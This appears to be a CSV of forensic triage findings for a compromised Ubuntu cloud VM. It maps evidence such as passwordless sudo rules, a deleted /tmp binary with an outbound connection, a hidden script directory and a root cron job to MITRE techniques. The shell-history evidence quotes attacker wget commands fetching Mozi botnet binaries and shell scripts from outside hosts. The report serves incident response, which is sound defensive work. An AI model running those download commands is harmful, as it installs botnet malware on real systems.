severity,category,title,mitre,artifact,count,first_utc,last_utc,detail,evidence_count,evidence
HIGH,Privilege,Passwordless sudo rule,T1548.003 Sudo and Sudo Caching,[root]/etc/sudoers.d/omsagent,1,,,Anyone matching this rule escalates to root without a password prompt.,1,/etc/sudoers.d/omsagent: omsagent ALL=(ALL) NOPASSWD: /usr/bin/python2 /opt/microsoft/omsconfig/modules/nxOMSAutomationWorker/DSCResources/MSFT_nxOMSAutomationWorkerResource/automationworker/worker/main.py *
HIGH,Privilege,Passwordless sudo rule,T1548.003 Sudo and Sudo Caching,[root]/etc/sudoers.d/omsagent,1,,,Anyone matching this rule escalates to root without a password prompt.,1,/etc/sudoers.d/omsagent: omsagent ALL=(ALL) NOPASSWD: /usr/bin/python2 /opt/microsoft/omsconfig/modules/nxOMSAutomationWorker/DSCResources/MSFT_nxOMSAutomationWorkerResource/automationworker/worker/omsutil.py *
HIGH,Privilege,Passwordless sudo rule,T1548.003 Sudo and Sudo Caching,[root]/etc/sudoers.d/omsagent,1,,,Anyone matching this rule escalates to root without a password prompt.,1,/etc/sudoers.d/omsagent: omsagent ALL=(ALL) NOPASSWD: /usr/bin/python3 /opt/microsoft/omsconfig/modules/nxOMSAutomationWorker/DSCResources/MSFT_nxOMSAutomationWorkerResource/automationworker/3.x/worker/main.py *
HIGH,Privilege,Passwordless sudo rule,T1548.003 Sudo and Sudo Caching,[root]/etc/sudoers.d/omsagent,1,,,Anyone matching this rule escalates to root without a password prompt.,1,/etc/sudoers.d/omsagent: omsagent ALL=(ALL) NOPASSWD: /usr/bin/python3 /opt/microsoft/omsconfig/modules/nxOMSAutomationWorker/DSCResources/MSFT_nxOMSAutomationWorkerResource/automationworker/3.x/worker/omsutil.py *
HIGH,Privilege,Passwordless sudo rule,T1548.003 Sudo and Sudo Caching,[root]/etc/sudoers.d/omsagent,1,,,Anyone matching this rule escalates to root without a password prompt.,1,/etc/sudoers.d/omsagent: omsagent ALL=(ALL) NOPASSWD: /usr/bin/pkill -u nxautomation *
HIGH,Privilege,Passwordless sudo rule,T1548.003 Sudo and Sudo Caching,[root]/etc/sudoers.d/omsagent,1,,,Anyone matching this rule escalates to root without a password prompt.,1,/etc/sudoers.d/omsagent: omsagent ALL=(ALL) NOPASSWD: /usr/bin/tail *
HIGH,Privilege,Passwordless sudo rule,T1548.003 Sudo and Sudo Caching,[root]/etc/sudoers.d/omsagent,1,,,Anyone matching this rule escalates to root without a password prompt.,1,/etc/sudoers.d/omsagent: omsagent ALL=(ALL) NOPASSWD: /bin/tail *
HIGH,Privilege,Passwordless sudo rule,T1548.003 Sudo and Sudo Caching,[root]/etc/sudoers.d/omsagent,1,,,Anyone matching this rule escalates to root without a password prompt.,1,/etc/sudoers.d/omsagent: omsagent ALL=(ALL) NOPASSWD: /opt/microsoft/omsconfig/Scripts/OMS_MetaConfigHelper.py *
HIGH,Privilege,Passwordless sudo rule,T1548.003 Sudo and Sudo Caching,[root]/etc/sudoers.d/omsagent,1,,,Anyone matching this rule escalates to root without a password prompt.,1,/etc/sudoers.d/omsagent: omsagent ALL=(ALL) NOPASSWD: /opt/microsoft/omsconfig/Scripts/python3/OMS_MetaConfigHelper.py *
HIGH,Process,Process(es) with a deleted executable image open,T1070.004 Indicator Removal: File Deletion,live_response/process/lsof_-nPl.txt,8,2021-10-09 15:06:17,2021-12-05 08:28:02,,8,"none        609              0  txt       REG                0,1     8632      15254 / (deleted)
agettyd   24330              1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330  7897        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330 24333        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330 24334        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330 24335        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330 24336        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330 24337        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)"
MEDIUM,Account,Account(s) present in /etc/passwd but not in the backup copy,T1136 Create Account,[root]/etc/passwd,1,,,"/etc/passwd- is the previous version written on the last account change; names appearing only in the live file were added most recently. Package installs create service accounts this way too, so check the name against the software inventory before treating it as attacker activity.",1,nxautomation:997
MEDIUM,Account,Membership of privileged groups,T1098 Account Manipulation,[root]/etc/group,4,,,sudo/wheel/docker/lxd/disk/shadow membership is equivalent to root on most systems - confirm every member is expected.,4,"adm:x:4:syslog,azureuser
sudo:x:27:azureuser
video:x:44:azureuser
lxd:x:108:azureuser"
MEDIUM,Account,System account(s) with an interactive shell,T1136,[root]/etc/passwd,2,,,Service accounts normally have nologin/false. An interactive shell on a low uid is a quiet persistence trick.,2,"omsagent:x:998:999:OMS agent:/var/opt/microsoft/omsagent/run:/bin/bash
nxautomation:x:997:996:nxOMSAutomation:/home/nxautomation/run:/bin/bash"
MEDIUM,Anti-forensics,Shell history missing or empty for interactive user(s),T1070.003 Clear Command History,[root]/home,1,,,"An interactive account that logged in but left no history is consistent with `history -c`, HISTFILE=/dev/null, or the file being deleted. It can also simply mean the shell has not exited yet - correlate with the login records.",1,nxautomation (/home/nxautomation/run/.bash_history) - no .bash_history collected
MEDIUM,Configuration,Host firewall disabled,T1562.004 Impair Defenses: Disable or Modify System Firewall,[root]/etc/ufw/ufw.conf,1,,,,1,/etc/ufw/ufw.conf
MEDIUM,Execution,Suspicious commands in shell history,T1059 Command and Scripting Interpreter,[root]/home/azureuser/.bash_history,31,,,"Commands recovered from user history files that match attacker tradecraft. History is attacker-controlled - absence proves nothing, presence is strong evidence.",31,"/home/azureuser/.bash_history: wget   [remote download]
/home/azureuser/.bash_history: wget https://dlcdn.apache.org//httpd/httpd-2.4.49.tar.gz   [remote download]
/home/azureuser/.bash_history: wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-oss-7.15.0-amd64.deb   [remote download]
/home/azureuser/.bash_history: wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -   [remote download]
/home/azureuser/.bash_history: wget http://198.18.0.37:59245/Mozi.m   [remote download]
/home/azureuser/.bash_history: wget http://198.18.0.38/unk.sh   [remote download]
/home/azureuser/.bash_history: cat error_log | egrep ""curl|wget""   [remote download]
/home/azureuser/.bash_history: cat error_log | egrep ""curl|wget"" | perl -ne 's/.*/data\-HEAP...(.*)/2/g; print;'   [remote download]
/home/azureuser/.bash_history: cat error_log | egrep ""curl|wget"" | perl -ne 's/.*data\-HEAP...(.*)/2/g; print;'   [remote download]
/home/azureuser/.bash_history: cat error_log | egrep ""curl|wget"" | perl -ne 's/.*data\-HEAP...(.*)/$2/g; print;'   [remote download]
/home/azureuser/.bash_history: cat error_log | egrep ""curl|wget"" | perl -ne 's/.*data\-HEAP\)\: (.*)/$2/g; print;'   [remote download]
/home/azureuser/.bash_history: cat error_log | egrep ""curl|wget"" | perl -ne 's/.*data\-HEAP\)\: (.*)/$1/g; print;'   [remote download]
/home/azureuser/.bash_history: cat error_log | egrep ""curl|wget""   [remote download]
/home/azureuser/.bash_history: cat error_log | egrep ""curl|wget""  | grep -v Agent   [remote download]
/home/azureuser/.bash_history: cat error_log | egrep ""curl|wget""  | grep -v Agent   [remote download]
/home/azureuser/.bash_history: egrep -i ""curl|wget"" error_log   [remote download]
/home/azureuser/.bash_history: wget http://198.18.0.39:58061/Mozi.a   [remote download]
/home/azureuser/.bash_history: wget http://198.18.0.40/wget.sh   [remote download]
/home/azureuser/.bash_history: cat wget.sh   [remote download]
/home/azureuser/.bash_history: wget http://198.18.0.41/bins/   [remote download]
/home/azureuser/.bash_history: rm wget.sh   [remote download]
/root/.bash_history: grep wget .bash_history   [remote download]
/root/.bash_history: insmod ./lime-5.4.0-1059-azure.ko ""path=ubuntu.mem format=lime""   [kernel module load]
/root/.bash_history: insmod ./lime-5.4.0-1059-azure.ko ""path=ubuntu.20211008.mem format=lime""   [kernel module load]
/root/.bash_history: insmod ./lime-5.4.0-1059-azure.ko ""path=ubuntu.20211008.mem format=lime""   [kernel module load]
/root/.bash_history: insmod ./lime-5.4.0-1059-azure.ko ""path=ubuntu.20211008.mem format=lime""   [kernel module load]
/root/.bash_history: grep curl error_log   [remote download]
/root/.bash_history: grep curl error_log  | grep "".sh   [remote download]
/root/.bash_history: grep curl error_log  | grep "".sh""   [remote download]
/root/.bash_history: grep curl error_log  | grep ""\.sh""   [remote download]
/root/.bash_history: chmod +x .remove.sh   [granting execute / world-write / setuid]"
MEDIUM,Filesystem,134 system file(s) created or modified within 72h of collection,,bodyfile/bodyfile.txt,134,2021-12-07 06:24:43,2021-12-08 06:34:59,"Changes to /etc, /usr, /bin, /lib and /boot inside the incident window are the shortest path to what the intruder touched.",60,"2021-12-07 06:25:50  -rw-r--r-- uid=0 size=18352    /usr/lib/x86_64-linux-gnu/samba/libsamba-python.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=18352    /usr/lib/x86_64-linux-gnu/samba/libutil-cmdline.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=18352    /usr/lib/x86_64-linux-gnu/samba/libxattr-tdb.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=19832    /usr/lib/x86_64-linux-gnu/samba/libsmbldaphelper.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=199288   /usr/lib/x86_64-linux-gnu/samba/libhcrypto-samba4.so.5.0.1
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=20200    /usr/lib/x86_64-linux-gnu/samba/libpopt-samba3.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=202704   /usr/lib/x86_64-linux-gnu/samba/libsmbclient-raw.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=207600   /usr/lib/x86_64-linux-gnu/samba/libgssapi-samba4.so.2.0.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=22448    /usr/lib/x86_64-linux-gnu/samba/libsmb-transport.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=22448    /usr/lib/x86_64-linux-gnu/samba/libtrusts-util.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=22504    /usr/lib/x86_64-linux-gnu/samba/libdfs-server-ad.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=22832    /usr/lib/x86_64-linux-gnu/samba/libsamba-debug.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=26544    /usr/lib/x86_64-linux-gnu/samba/libcli-spoolss.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=26544    /usr/lib/x86_64-linux-gnu/samba/libhttp.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=26616    /usr/lib/x86_64-linux-gnu/samba/libdnsserver-common.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=27096    /usr/lib/x86_64-linux-gnu/samba/libheimntlm-samba4.so.1.0.1
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=282512   /usr/lib/x86_64-linux-gnu/samba/libsamba-net.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=285368   /usr/lib/x86_64-linux-gnu/samba/libhx509-samba4.so.5.0.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=30640    /usr/lib/x86_64-linux-gnu/samba/libcli-ldap-common.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=30640    /usr/lib/x86_64-linux-gnu/samba/libcommon-auth.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=30712    /usr/lib/x86_64-linux-gnu/samba/libservice.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=3420368  /usr/lib/x86_64-linux-gnu/samba/libsmbd-base.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=34808    /usr/lib/x86_64-linux-gnu/samba/libnpa-tstream.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=34808    /usr/lib/x86_64-linux-gnu/samba/libshares.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=38832    /usr/lib/x86_64-linux-gnu/samba/libcli-nbt.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=38832    /usr/lib/x86_64-linux-gnu/samba/libdbwrap.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=419760   /usr/lib/x86_64-linux-gnu/samba/liblibsmb.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=42928    /usr/lib/x86_64-linux-gnu/samba/libmessages-dgm.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=42928    /usr/lib/x86_64-linux-gnu/samba/libsamba3-util.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=436616   /usr/lib/x86_64-linux-gnu/samba/libkrb5-samba4.so.26.0.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=47024    /usr/lib/x86_64-linux-gnu/samba/libkrb5samba.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=51592    /usr/lib/x86_64-linux-gnu/samba/libroken-samba4.so.19.0.1
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=5992     /usr/lib/x86_64-linux-gnu/samba/libmessages-util.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=5992     /usr/lib/x86_64-linux-gnu/samba/libsmbd-shim.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=5992     /usr/lib/x86_64-linux-gnu/samba/libsocket-blocking.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=5992     /usr/lib/x86_64-linux-gnu/samba/libutil-setid.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=6064     /usr/lib/x86_64-linux-gnu/samba/libcmdline-credentials.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=6064     /usr/lib/x86_64-linux-gnu/samba/libevents.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=6064     /usr/lib/x86_64-linux-gnu/samba/libflag-mapping.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=6064     /usr/lib/x86_64-linux-gnu/samba/libgenrand.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=6064     /usr/lib/x86_64-linux-gnu/samba/libiov-buf.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=6064     /usr/lib/x86_64-linux-gnu/samba/libtime-basic.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=6136     /usr/lib/x86_64-linux-gnu/samba/libserver-role.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=75792    /usr/lib/x86_64-linux-gnu/samba/libcli-ldap.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=75840    /usr/lib/x86_64-linux-gnu/samba/libdsdb-module.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=76584    /usr/lib/x86_64-linux-gnu/samba/libgpo.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=79792    /usr/lib/x86_64-linux-gnu/samba/libcliauth.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=79792    /usr/lib/x86_64-linux-gnu/samba/libdsdb-garbage-collect-tombstones.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=92080    /usr/lib/x86_64-linux-gnu/samba/libdcerpc-samba4.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=96176    /usr/lib/x86_64-linux-gnu/samba/libsecrets3.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=96248    /usr/lib/x86_64-linux-gnu/samba/libprinting-migrate.so.0
2021-12-07 06:25:50  -rw-r--r-- uid=0 size=96248    /usr/lib/x86_64-linux-gnu/samba/libsamba-sockets.so.0
2021-12-07 06:25:56  -rw-r--r-- uid=0 size=14264    /usr/lib/x86_64-linux-gnu/samba/libwinbind-client.so.0
2021-12-07 06:25:56  -rw-r--r-- uid=0 size=51120    /usr/lib/x86_64-linux-gnu/libwbclient.so.0.14
2021-12-07 06:25:56  -rw-r--r-- uid=0 size=5992     /usr/lib/x86_64-linux-gnu/samba/libreplace.so.0
2021-12-07 06:27:05  -rw-r--r-- uid=0 size=9542     /etc/samba/smb.conf
2021-12-07 06:27:13  -rw-r--r-- uid=0 size=34629    /etc/ld.so.cache
2021-12-08 06:25:25  -rwxr-xr-x uid=0 size=305280   /usr/lib/initramfs-tools/bin/busybox
2021-12-08 06:25:36  -rwxr-xr-x uid=0 size=2062296  /bin/busybox
2021-12-08 06:34:59  -rw-r--r-- uid=0 size=30287776 /boot/initrd.img-5.4.0-1064-azure"
MEDIUM,Kernel,dmesg: userland crash (possible exploitation attempt) (13 line(s)),,live_response/hardware/dmesg.txt,13,2021-12-06 03:42:57,2021-12-08 18:52:21,,13,"[4970209.120311] auomscollect[18648]: segfault at 7f11da6ff150 ip 00000000004c1ba7 sp 00007f11d6051dd8 error 4 in auomscollect[400000+1bb000]
[4975935.072681] auomscollect[23180]: segfault at 7f1c5f4a2150 ip 00000000004c1ba7 sp 00007f1c5adf4dd8 error 4 in auomscollect[400000+1bb000]
[5051053.436322] auomscollect[20695]: segfault at 7f5e36161150 ip 00000000004c1ba7 sp 00007f5e31ab3dd8 error 4 in auomscollect[400000+1bb000]
[5055414.196559] auomscollect[23601]: segfault at 7fe11e5c21c0 ip 00000000004c1ba7 sp 00007fe119f14dd8 error 4 in auomscollect[400000+1bb000]
[5059023.923404] auomscollect[31922]: segfault at 7f72d4c951e0 ip 00000000004c1ba7 sp 00007f72d05e7dd8 error 4 in auomscollect[400000+1bb000]
[5089693.247695] auomscollect[19503]: segfault at 7f10793ad150 ip 00000000004c1ba7 sp 00007f1074cffdd8 error 4 in auomscollect[400000+1bb000]
[5101441.681152] auomscollect[32413]: segfault at 7fcb856f01c0 ip 00000000004c1ba7 sp 00007fcb81042dd8 error 4 in auomscollect[400000+1bb000]
[5116335.379494] auomscollect[4648]: segfault at 7f0b73701150 ip 00000000004c1ba7 sp 00007f0b6f053dd8 error 4 in auomscollect[400000+1bb000]
[5129817.346526] auomscollect[5901]: segfault at 7fde92d841c0 ip 00000000004c1ba7 sp 00007fde8e6d6dd8 error 4 in auomscollect[400000+1bb000]
[5134915.671839] auomscollect[32525]: segfault at 7fb3a30d61c0 ip 00000000004c1ba7 sp 00007fb39ea28dd8 error 4 in auomscollect[400000+1bb000]
[5152934.187374] auomscollect[26663]: segfault at 7f9ad665c150 ip 00000000004c1ba7 sp 00007f9ad1faedd8 error 4 in auomscollect[400000+1bb000]
[5190496.823707] auomscollect[19279]: segfault at 7f1d50d3a150 ip 00000000004c1ba7 sp 00007f1d4c68cdd8 error 4 in auomscollect[400000+1bb000]
[5197573.997609] auomscollect[522]: segfault at 7f5951b2d300 ip 00000000004c1ba7 sp 00007f594d47fdd8 error 4 in auomscollect[400000+1bb000]"
MEDIUM,Network,7 connection(s) to non-RFC1918 addresses,T1071 Application Layer Protocol,live_response/network/ss_-anp.txt,7,2021-11-19 01:05:40,2021-12-08 16:12:25,,7,"tcp    ESTAB       10.0.0.4:33680           198.18.0.42:443         filebeat(pid 27359)
tcp    ESTAB       10.0.0.4:33610           198.18.0.43:443           filebeat(pid 27359)
tcp    ESTAB       10.0.0.4:33612           198.18.0.43:443           filebeat(pid 27359)
tcp    ESTAB       10.0.0.4:44214           198.18.0.44:443       agettyd(pid 24330)
tcp    ESTAB       10.0.0.4:22              198.18.0.0:29953     sshd(pid 4204), sshd(pid 4092)
tcp    ESTAB       10.0.0.4:46202           198.18.0.45:443        filebeat(pid 27359)
tcp    ESTAB       10.0.0.4:46200           198.18.0.45:443        filebeat(pid 27359)"
MEDIUM,Persistence,Suspicious content in scheduled task definitions,T1053.003 Scheduled Task: Cron,[root]/etc/cron*,1,,,,1,/etc/cron.daily/popularity-contest: if setsid /usr/share/popularity-contest/popcon-upload \   [detached background execution]
MEDIUM,Persistence,Suspicious systemd unit definition(s),T1543.002 Systemd Service,[root]/etc/systemd/system,1,,,,1,/lib/systemd/system/intel-sgx-load-module.service: ExecStart=/sbin/modprobe intel_sgx   [kernel module load]
MEDIUM,Persistence,User crontab: root,T1053.003 Scheduled Task: Cron,[root]/var/spool/cron/crontabs/root,1,,,,1,* * * * * /root/.remove.sh
MEDIUM,Process,2 process(es) with a suspicious working directory,,live_response/process/ls_-l_proc_pid_cwd.txt,2,2021-11-14 01:26:25,2021-12-08 18:50:45,,2,"PID 6388    cwd=/var/tmp/.log/101068/.spoollog (deleted)  sleep 300
PID 20645   cwd=/var/tmp/.log/101068/.spoollog (deleted)  sh .src.sh"
MEDIUM,Process,Open regular files in temp / shared-memory directories,,live_response/process/lsof_-nPl.txt,8,2021-11-14 01:26:25,2021-12-05 08:28:02,A daemon holding a file open under /tmp or /dev/shm is worth a look; audio and tracing libraries do it routinely.,8,"sh        20645              1   10r      REG               8,17     9087     528810 /var/tmp/.log/101068/.spoollog/.src.sh (deleted)
agettyd   24330              1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330  7897        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330 24333        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330 24334        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330 24335        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330 24336        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330 24337        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)"
MEDIUM,Rootkit,chkrootkit artifact: chkrootkit_-n_-r.txt.stderr,,chkrootkit/chkrootkit_-n_-r.txt.stderr,1,,,,1,./uac: 1: eval: chkrootkit: not found
MEDIUM,Rootkit,chkrootkit artifact: chkrootkit_-n_-r_-x.txt.stderr,,chkrootkit/chkrootkit_-n_-r_-x.txt.stderr,1,,,,1,./uac: 1: eval: chkrootkit: not found
MEDIUM,Software,7 package operation(s) within 72h of collection,T1072 Software Deployment Tools,[root]/var/log/dpkg.log,7,2021-12-07 06:24:15,2021-12-08 06:25:35,"Software installed or removed during the incident window - attackers install their toolchain, and remove evidence.",7,"2021-12-07 06:24:15 upgrade python-samba:amd64 2:4.7.6+dfsg~ubuntu-0ubuntu2.26
2021-12-07 06:24:39 upgrade samba-common-bin:amd64 2:4.7.6+dfsg~ubuntu-0ubuntu2.26
2021-12-07 06:24:45 upgrade samba-common:all 2:4.7.6+dfsg~ubuntu-0ubuntu2.26
2021-12-07 06:24:48 upgrade samba-libs:amd64 2:4.7.6+dfsg~ubuntu-0ubuntu2.26
2021-12-07 06:25:55 upgrade libwbclient0:amd64 2:4.7.6+dfsg~ubuntu-0ubuntu2.26
2021-12-08 06:25:25 upgrade busybox-initramfs:amd64 1:1.27.2-2ubuntu3.4
2021-12-08 06:25:35 upgrade busybox-static:amd64 1:1.27.2-2ubuntu3.4"
MEDIUM,Software,Dual-use / offensive tooling installed,T1588.002 Obtain Capabilities: Tool,live_response/packages/dpkg_-l.txt,5,,,These packages are legitimate administration tools and also standard attacker equipment - confirm they belong on this host.,5,"cryptsetup 2:2.0.2-1ubuntu1.2
netcat-openbsd 1.187-1ubuntu0.1
tcpdump 4.9.3-0ubuntu0.18.04.1
telnet 0.17-41
upx-ucl 3.94-4"
MEDIUM,Software,apt session(s) within the incident window,,[root]/var/log/apt/history.log,3,2021-12-07 06:23:59,2021-12-08 06:25:34,,3,"2021-12-07  06:23:59  /usr/bin/unattended-upgrade  (by root)
2021-12-08  06:25:23  /usr/bin/unattended-upgrade  (by root)
2021-12-08  06:25:34  /usr/bin/unattended-upgrade  (by root)"
